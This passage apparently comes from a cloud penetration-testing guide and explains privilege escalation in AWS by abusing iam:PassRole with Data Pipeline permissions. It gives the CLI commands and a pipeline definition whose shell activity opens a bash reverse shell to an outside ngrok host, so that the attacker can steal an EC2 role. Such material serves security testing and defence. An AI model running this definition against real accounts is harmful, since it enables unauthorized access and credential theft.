### `iam:PassRole`, `datapipeline:CreatePipeline`, `datapipeline:PutPipelineDefinition`, `datapipeline:ActivatePipeline`

Users with these **permissions can escalate privileges by creating a Data Pipeline** to execute arbitrary commands using the **permissions of the assigned role:**

```bash
aws datapipeline create-pipeline --name my_pipeline --unique-id unique_string
```

After pipeline creation, the attacker updates its definition to dictate specific actions or resource creations:

```json
{
  "objects": [
    {
      "id": "CreateDirectory",
      "type": "ShellCommandActivity",
      "command": "bash -c 'bash -i >& /dev/tcp/8.tcp.ngrok.io/13605 0>&1'",
      "runsOn": { "ref": "instance" }
    },
    {
      "id": "Default",
      "scheduleType": "ondemand",
      "failureAndRerunMode": "CASCADE",
      "name": "Default",
      "role": "assumable_datapipeline",
      "resourceRole": "assumable_datapipeline"
    },
    {
      "id": "instance",
      "name": "instance",
      "type": "Ec2Resource",
      "actionOnTaskFailure": "terminate",
      "actionOnResourceFailure": "retryAll",
      "maximumRetries": "1",
      "instanceType": "t2.micro",
      "securityGroups": ["default"],
      "role": "assumable_datapipeline",
      "resourceRole": "assumable_ec2_profile_instance"
    }
  ]
}
```

> [!NOTE]
> Note that the **role** in **line 14, 15 and 27** needs to be a role **assumable by datapipeline.amazonaws.com** and the role in **line 28** needs to be a **role assumable by ec2.amazonaws.com with a EC2 profile instance**.
>
> Moreover, the EC2 instance will only have access to the role assumable by the EC2 instance (so you can only steal that one).

```bash
aws datapipeline put-pipeline-definition --pipeline-id <pipeline-id> \
    --pipeline-definition file:///pipeline/definition.json
```

The **pipeline definition file, crafted by the attacker, includes directives to execute commands** or create resources via the AWS API, leveraging the Data Pipeline's role permissions to potentially gain additional privileges.

**Potential Impact:** Direct privesc to the ec2 service role specified.
